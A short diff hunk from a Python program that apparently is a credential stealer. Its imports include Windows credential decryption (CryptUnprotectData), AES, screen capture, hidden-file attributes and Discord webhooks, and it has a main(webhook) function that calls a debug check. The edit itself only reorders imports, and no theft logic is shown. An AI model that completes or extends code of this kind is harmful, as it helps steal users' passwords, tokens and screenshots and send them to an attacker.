@@ -15,12 +15,11 @@ import psutil
 import requests
 import wmi
 from Crypto.Cipher import AES
-from discord import Embed, File, RequestsWebhookAdapter, Webhook
+from discord import RequestsWebhookAdapter, Embed, File, Webhook
 from PIL import ImageGrab
 from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
-
 
 def main(webhook: str) -> None: 
     debug()
